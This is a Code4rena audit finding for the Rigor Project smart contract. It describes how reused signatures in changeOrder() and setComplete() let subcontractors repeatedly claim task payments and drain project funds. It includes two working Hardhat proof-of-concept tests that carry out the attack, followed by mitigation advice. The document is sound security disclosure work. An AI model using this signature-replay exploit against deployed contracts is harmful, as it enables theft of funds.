## Tags

- bug
- 3 (High Risk)
- sponsor confirmed
- valid

# [Project funds can be drained by reusing signatures, in some cases](https://github.com/code-423n4/2022-08-rigor-findings/issues/95) 

# Lines of code

https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L386-L490
https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330-L359
https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L153-L164


# Vulnerability details


This attack path is the results of signatures reusing in 2 functions - `changeOrder()` and `setComplete()`, and a missing modifier at `Tasks.unApprove()` library function.

## Impact

### Draining the project from funds

Current or previous subcontractor of a task can drain the project out of its funds by running `setComplete()` multiple times.

This can be exploited in 3 scenarios:
* The price of a task was changed to a price higher than available funds (i.e. `totalLent - _totalAllocated`, and therefore gets unapproved), and than changed back to the original price (or any price that's not higher than available funds)
* The subcontractor for a task was changed via `changeOrder` and then changed back to the original subcontractor 
    * e.g. - Bob was the original SC, it was changed to Alice, and then back to Bob
* Similar to the case above, but even if the current SC is different from the original SC - it can still work if the current and previous SCs are teaming up to run the attack 
    * e.g. Bob was the original SC, it was changed to Alice, and changed again to Eve. And now Alice and Eve are teaming up to drain funds from the project

After `setComplete()` ran once by the legitimate users (i.e. signed by contractor, SC and builder), the attackers can now run it multiple times:
* Reuse signatures to run `changeOrder()` - changing SC or setting the price to higher than available funds
    * The only signer that might change is the subcontractor, he's either teaming up with the attacker (scenario #3) or he was the SC when it was first called (scenario #2)
* In case of price change:
    * change it back to the original price via `changeOrder()`, reusing signatures
    * Run `allocateFunds()` to mark it as funded again
* SC runs `acceptInvite()` to mark task as active
* Run `setComplete()` reusing signatures
    * If SC has changed - replace his signature with the current one (current SC should be one of the attackers)
* Repeat till the project runs out of funds

### Changing tasks costs/subcontractor by external users
This can also be used by external users (you don't need to be builder/GC/SC in order to run `changeOrder()`) to troll the system (This still requires the task to be changed at least twice, otherwise re-running `changeOrder()` with the same data would have no effect).

* Changing the task cost up or down, getting the SC paid a different amount than intended (if it goes unnoticed, or front-run the `setComplete()` function)
* Unapproving a task by setting a different SC or a price higher than available funds
    * The legitimate users can change it back, but the attacker can change it again, both sides playing around till someone gets tired :)


## Proof of Concept

Since the tests depend on each other, the PoC tests were created by adding them to the file `test/utils/projectTests.ts`, after the function `it('should be able to complete a task'` ( [Line 1143](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/projectTests.ts#L1143) ).

In the first test - a subcontractor is changed and then changed back.
In the second scenario a price is changed to the new price (that is higher than the total available funds, and therefore is unapproved) and then back to its original price (it can actually be any price that is not higher than the available funds).
In both cases I'm demonstrating how the project can be drained out of fund, 

```typescript

  type DataType = {
    types: string[];
    values: (string | number)[];
  };

  it('PoC change SC', async () => {



    const taskID = 1;
    let taskDetails = await project.getTask(taskID);
    const scBob = taskDetails.subcontractor;
    const scAliceSigner = signers[4];
    console.log({ scBob, alice: scAliceSigner.address });
    const newCost = taskCost; // same as old
    console.log(taskDetails);
    // await (await project.inviteSC([taskID], [signers[2].address])).wait();

    const changeToAliceData = {
      types: ['uint256', 'address', 'uint256', 'address'],
      values: [taskID, scAliceSigner.address, newCost, project.address],
    };
    const changeToAliceSignedData = await signData(changeToAliceData);

    await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);

    const changeToBobData = {
      types: ['uint256', 'address', 'uint256', 'address'],
      values: [taskID, scBob, newCost, project.address],
    };
    const changeToBobSignedData = await signData(changeToBobData);

    await changeSC(changeToBobSignedData[0], changeToBobSignedData[1]);

    const bobSigner = getSignerByAddress(signers, scBob);
    await (await project.connect(bobSigner).acceptInviteSC([taskID])).wait();

    // for some reason if you don't do this you get 'Mock on the method is not initialized' error
    await mockDAIContract.mock.transfer
      .withArgs(scAliceSigner.address, taskCost)
      .returns(true);
    await mockDAIContract.mock.transfer
      .withArgs(scBob, taskCost)
      .returns(true);
    await mockDAIContract.mock.transfer
      .withArgs(await homeFiContract.treasury(), taskCost / 1e3)
      .returns(true);


    const setCompleteData = {
      types: ['uint256', 'address'],
      values: [taskID, project.address],
    };
    let setCompleteSignedData = await signData(setCompleteData);
    let tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);
    await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);


    // attack start
    await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);

    await (await project.connect(scAliceSigner).acceptInviteSC([taskID])).wait();

    // the only thing that has changed is that alice became a subcontractor
    // IRL Alice can simply take the old signatures and replace Bob's signature
    // with her own signature
    let aliceSetCompleteSignedData = await signData(setCompleteData);


    tx = await project.setComplete(setCompleteSignedData[0], aliceSetCompleteSignedData[1]);
    await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);

    await changeSC(changeToBobSignedData[0], changeToBobSignedData[1]);
    await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);

    await (await project.connect(scAliceSigner).acceptInviteSC([taskID])).wait();
    
    tx = await project.setComplete(setCompleteSignedData[0], aliceSetCompleteSignedData[1]);
    await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);
    

    async function signData(data: DataType) {
      let contractor = await project.contractor();
      let builder = await project.builder();
      let taskDetails = await project.getTask(taskID);
      let sc = taskDetails.subcontractor;
      // console.log({ contractor, builder, sc })

      let changeSignersAddress = [contractor, sc];
      let contractorDelegated = await project.contractorDelegated();
      if (!contractorDelegated) {
        changeSignersAddress.unshift(builder);
      }
      changeSignersAddress = changeSignersAddress.filter(x => x !== ethers.constants.AddressZero);
      const dataSigners = changeSignersAddress.map(signer => getSignerByAddress(signers, signer));

      // console.log({ changeSignersAddress })
      return await multisig(data, dataSigners);
    }

    async function changeSC(encodedData: string, signature: string) {
      const tx = await project.changeOrder(encodedData, signature);
      tx.wait();
      await expect(tx).to.emit(project, 'ChangeOrderSC');
    }
  });


  it('PoC change cost', async () => {
    const taskID = 1;
    let taskDetails = await project.getTask(taskID);
    const originalSC = taskDetails.subcontractor;
    const originalCost = taskCost; 
    const veryHighNewCost = taskCost * 10;
    console.log(taskDetails);
    // await (await project.inviteSC([taskID], [signers[2].address])).wait();

    const changeToNewData = {
      types: ['uint256', 'address', 'uint256', 'address'],
      values: [taskID, originalSC, veryHighNewCost, project.address],
    };
    const changeToNewSignedData = await signData(changeToNewData);

    await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);

    const changeBackToOldData = {
      types: ['uint256', 'address', 'uint256', 'address'],
      values: [taskID, originalSC, originalCost, project.address],
    };
    const changeBackToOldSignedData = await signData(changeBackToOldData);

    await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);
    taskDetails = await project.getTask(taskID);

    await expect(taskDetails.cost).to.be.equal(originalCost);

    const originalSCSigner = getSignerByAddress(signers, originalSC);
    await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();
    await project.allocateFunds();

    // for some reason if you don't do this you get 'Mock on the method is not initialized' error
    await mockDAIContract.mock.transfer
      .withArgs(originalSC, taskCost)
      .returns(true);
    await mockDAIContract.mock.transfer
      .withArgs(await homeFiContract.treasury(), taskCost / 1e3)
      .returns(true);


    const setCompleteData = {
      types: ['uint256', 'address'],
      values: [taskID, project.address],
    };
    let setCompleteSignedData = await signData(setCompleteData);
    let tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);
    await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);


    // attack start
    await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);
    await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);

    await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();
    await project.allocateFunds();



    tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);
    await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);

    await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);
    await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);

    await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();
    await project.allocateFunds();

    tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);
    await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);
    
    async function signData(data: DataType) {
      let contractor = await project.contractor();
      let builder = await project.builder();
      let taskDetails = await project.getTask(taskID);
      let sc = taskDetails.subcontractor;
      // console.log({ contractor, builder, sc })

      let changeSignersAddress = [contractor, sc];
      let contractorDelegated = await project.contractorDelegated();
      if (!contractorDelegated) {
        changeSignersAddress.unshift(builder);
      }
      changeSignersAddress = changeSignersAddress.filter(x => x !== ethers.constants.AddressZero);
      const dataSigners = changeSignersAddress.map(signer => getSignerByAddress(signers, signer));

      // console.log({ changeSignersAddress })
      return await multisig(data, dataSigners);
    }

    async function changeCost(encodedData: string, signature: string) {
      const tx = await project.changeOrder(encodedData, signature);
      tx.wait();
      // await expect(tx).to.emit(project, 'ChangeOrderSC');
    }
  });

```

## Tools Used
Hardhat

## Recommended Mitigation Steps

* Use nonce to protect `setComplete()` and `changeOrder()` from signatures reuse
* Add the `onlyActive()` modifier to `Tasks.unApprove()`
* Consider limiting `allocateFunds()` for builder only (this is not necessary to resolve the bug, just for hardening security)